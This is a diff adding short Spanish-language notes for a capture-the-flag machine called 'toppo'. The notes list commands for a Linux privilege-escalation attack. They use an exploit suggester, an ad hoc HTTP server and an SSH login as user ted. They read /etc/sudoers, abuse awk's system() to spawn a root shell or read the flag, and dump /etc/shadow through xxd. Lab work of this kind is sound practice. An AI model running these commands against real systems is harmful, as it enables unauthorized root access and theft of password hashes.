@@ -1,0 +1,23 @@
+Ctf toppo
+---herramienta--
+linux exploit suggester
+--------------------------------
+Server
+python -m SimpleHTTPServer
+----------------------------
+gcc -o a nombre.c
+-----------------------------
+ssh ted@1.0.8.2 -p 22
+-------------------------------
+ver privilegios o sudors
+cat /etc/sudoers
+-------------------------------
+obtener privilegios con awk
+
+awk 'BEGIN {system("comando a ejecutar")}'
+awk 'BEGIN {system("cat /root/flag.txt")}'
+awk 'BEGIN {system("/bin/bash")}'
+
+----------------------------------------------
+ver hex del archivo shadow 
+xxd /etc/shadow | xxd -r
